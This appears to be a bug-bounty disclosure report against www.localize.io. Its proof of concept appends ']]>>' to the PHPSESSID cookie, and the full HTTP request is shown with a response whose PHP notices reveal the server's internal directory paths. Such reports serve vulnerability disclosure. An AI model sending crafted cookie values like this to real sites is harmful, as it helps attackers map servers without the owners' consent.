# HackerOne Report: Information Disclosure (Directory Structure)
**Report ID:** 7930
**Vulnerability Class:** Information Disclosure

## Vulnerability Information & PoC
The /var/www/ directory structure is exposed if you add "]]>>" to the PHPSESSID in the cookie.

Request:
GET / HTTP/1.1
Host: www.localize.io
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://www.localize.io/
Cookie: PHPSESSID=bomb3ogic5qur05apsq25nq821]]>>

Response:
HTTP/1.1 200 OK
Date: Thu, 17 Apr 2014 21:15:53 GMT
Server: Apache
Pragma: no-cache
Expires: Mon, 24 Mar 2008 00:00:00 GMT
Cache-Control: no-cache
X-Powered-By: PleskLin
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: PHPSESSID=mg5to8huhbv7bpk3q0003d5kg3; path=/; HttpOnly
Content-Length: 5819


Notice: Undefined index: HTTP_ACCEPT_ENCODING in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/classes/UI.php on line 147

Notice: Undefined index: HTTP_ACCEPT_ENCODING in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/classes/UI.php on line 147

## Discussion & Remediation Timeline
